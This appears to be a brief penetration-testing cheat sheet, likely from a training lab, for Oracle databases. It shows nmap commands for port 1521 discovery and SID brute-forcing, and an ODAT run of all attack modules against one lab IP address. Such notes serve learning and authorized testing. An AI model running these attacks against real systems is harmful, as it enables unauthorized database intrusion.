# Oracle

Check for oracle database 

```
sudo nmap -p1521 -sV 10.129.204.235 --open
```

Enumerate SID numbers (database identificationc)
```
sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute
```

Attack the oracle database (all = with all modules)

```
./odat.py all -s 10.129.204.235
```